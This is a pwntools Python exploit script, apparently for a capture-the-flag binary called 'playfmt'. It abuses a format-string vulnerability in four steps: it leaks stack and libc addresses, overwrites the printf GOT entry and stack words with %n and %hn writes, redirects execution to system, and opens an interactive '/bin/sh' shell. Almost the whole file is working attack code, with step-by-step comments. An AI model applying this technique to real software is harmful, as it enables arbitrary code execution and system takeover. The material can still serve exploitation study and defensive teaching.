#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./playfmt')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak do_fmt
continue
'''.format(**locals())

context.terminal = ["tilix", "-a", "session-add-right", "-e"]
context.log_level = 'debug'
context.delete_corefiles = True

# -- Exploit goes here --

io = start()

io.recvline()
io.recvline()
io.recvline()

# First step is to leak some stack address
# if you look closely, 6th address from beginning va_arg stack frame stores a stack address
# We can leak this address and get other valuable addresses on stack by calculating offsets
# like we can manipulate return addresses!

io.sendline('%6$x %8$x')
leaked_addrs = io.readline()[:-1].split()
stack_addr = int(leaked_addrs[0], base=16)
stdout_addr = int(leaked_addrs[1], base=16)

stdout_offset = 0x00220d40
do_fmt_ret_addr = stack_addr - 12
libc_base = stdout_addr - stdout_offset

info("Got an address on stack = %x", stack_addr)
info("_IO_2_1_stdout addr = %x", stack_addr)
info("libc base addr = %x", libc_base)
info("Return address pointer to be manipulated = %x", do_fmt_ret_addr)


# Second step is to write the write addresses onto stack
# in two parts onto stack. First part will let us write
# first two bytes and the second one will let us write last two bytes
# I know i'm evil XD

payload = flat(
    f'%{exe.got.printf}x',
    b'%10$n',
    f'%{2}x',
    b'%6$n'
)

io.sendline(payload)

# Third step is to overwrite the printf got entry and place system address there
# now the 15th address on stack contains the address of first two bytes to writeto
# and 11th address on stack contains the address of last two bytes to write to

# next step is to overwrite the return address with a system call
system_addr = libc_base + 0x49840
size1 = int(hex(system_addr)[6:], base=16)
size2 = int(hex(system_addr)[2:6], base=16) - size1

# write payload
payload = flat(
    f'%{size1}x',
    b'%14$hn',
    f'%{size2}x',
    b'%10$hn'
)

io.recvline()

info("size1 = %x", size1)
info("size2 = %x", size2)
info("libc.symbols.system = %x", system_addr)

io.sendline(payload)

# Step 4 is pwn!
# We call system('/bin/sh')
io.recvline()
io.sendline('/bin/sh')

io.interactive()

